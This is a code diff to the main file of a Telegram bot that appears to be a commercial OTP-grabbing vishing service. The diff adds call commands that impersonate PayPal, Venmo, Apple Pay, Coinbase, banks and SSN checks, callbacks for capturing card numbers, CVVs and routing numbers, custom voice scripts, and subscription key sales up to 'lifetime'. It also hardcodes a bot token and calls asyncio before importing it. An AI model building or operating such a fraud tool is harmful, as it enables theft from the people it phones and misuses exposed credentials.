@@ -1,14 +1,28 @@
+import uvloop
+asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+
 from aiogram import Bot, Dispatcher
 from aiogram.filters import Command
 import asyncio
-from utils import init_db, create_tables, escape_markdown
+import psutil
+from config import get_admin
+import os
+from utils import db, load_all_users
 from handlers import *
-from time import sleep
+
+def get_memory_usage():
+    process = psutil.Process(os.getpid())
+    mem = process.memory_info().rss / (1024 * 1024)  # Convert bytes to MB
+    return round(mem, 2)
+
+# Example: log it every few minutes
+async def log_memory():
+    while True:
+        await bot.send_message(-1002942544591,text=f"💾 Memory usage: {str(get_memory_usage())} MB")
+        await asyncio.sleep(300)
 
 bot = Bot(token='7886245319:AAGP1f1WQ_1Baw5ewNNlHTa6JsWRud5GP1Q')
 dp = Dispatcher()
-
-
 
 # START / HELP / UNKNOWN
 # COMMAND
@@ -17,41 +31,46 @@ dp.message.register(start_command, Command(commands=["start"]))
 
 # CALLBACK
 dp.callback_query.register(help_callback, lambda c: c.data == "help")
+dp.callback_query.register(enter_callback, lambda c: c.data == "enter")
+dp.callback_query.register(subsribed_callback, lambda c: c.data == "subscribed")
+dp.callback_query.register(features_callback, lambda c: c.data == "features")
+dp.callback_query.register(call_commands_callback, lambda c: c.data == "call_commands")
+dp.callback_query.register(phonelist_callback, lambda c: c.data == "phonelist")
 dp.callback_query.register(start_callback,
                            lambda c: c.data in ['back1', 'back4'])
 
 # SUBSCRIPTION
 # COMMANDS
 dp.message.register(purchase_command, Command(commands=["purchase"]))
+dp.message.register(prices_command, Command(commands=["prices"]))
 dp.message.register(my_profile_command, Command(commands=["plan"]))
 dp.message.register(redeem_keys, Command(commands=["redeem"]))
 
 # CALLBACKS
 dp.callback_query.register(wallets_callback,
-                           lambda c: c.data in ['20', '50', '90', '200'])
+                           lambda c: c.data in ['15','20', '50', '90', '200','1000'])
 dp.callback_query.register(wallet_callback, lambda c: ':' in c.data)
 dp.callback_query.register(purchase_callback, lambda c: c.data == "purchase")
-dp.callback_query.register(my_profile_callback, lambda c: c.data == "plan")
 
 # CALL
 dp.message.register(
     call_command,
     Command(commands=[
-        'repcall', 'recall', "call", "paypal", "venmo", "applepay", "coinbase",
+        'repportcall', 'recall', "call", "paypal", "venmo", "applepay", "coinbase",
         "microsoft", "amazon", "quadpay", "cashapp", "citizens", "marcus",
-        "carrier", 'creditcard'
+        "carrier", 'creditcard','ssn','customcall','customvoice'
     ]))
 dp.message.register(Phonelist_commands, Command(commands=["phonelist"]))
 
 # CALLBACKS
-dp.callback_query.register(otp_accept_callback, lambda c: c.data == "acp")
+dp.callback_query.register(otp_accept_callback, lambda c: c.data in ["acp",'den','card','cvv','rout'])
 
 # STTINGS
 # COMMANDS
 dp.message.register(voicelist_command,
                     Command(commands=["voicelist"]))  # NEED WORK
 dp.message.register(setvoice_command, Command(commands=["setvoice"]))
-dp.message.register(setscript_command, Command(commands=["setscript"]))
+dp.message.register(setscript_command, Command(commands=["createscript"]))
 dp.message.register(process_script_text, ScriptForm.waiting_for_script)
 dp.message.register(view_script, Command(commands=["script"]))
 
@@ -73,27 +92,21 @@ dp.callback_query.register(generate_keys_callback,
                            lambda c: c.data == 'g_keys')
 dp.callback_query.register(
     get_keys_callback,
-    lambda c: c.data in ['2 hours', '1 day', '4 days', '1 week', '1 month'])
+    lambda c: c.data in ['2 hours', '1 day', '4 days', '1 week', '1 month', 'lifetime'])
 
-dp.message.register(
-    unknown_command,
-    lambda message: message.text and message.text.startswith('/'))
+
 
 
 async def main():
-    print("Bot is running...")
-    await init_db()
-    await create_tables()
-    await dp.start_polling(bot)
+    print("🤖 Bot is running...")
+    await db.init_db()
+    await db.create_tables()
+    await load_all_users()
+    asyncio.create_task(log_memory())
+    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
 
 
-while True:
-    try:
-        asyncio.run(main())
-    except Exception as e:
-        print(f"❌ Bot crashed: {e}")
-        sleep(3)
-
+asyncio.run(main())
 
 
 
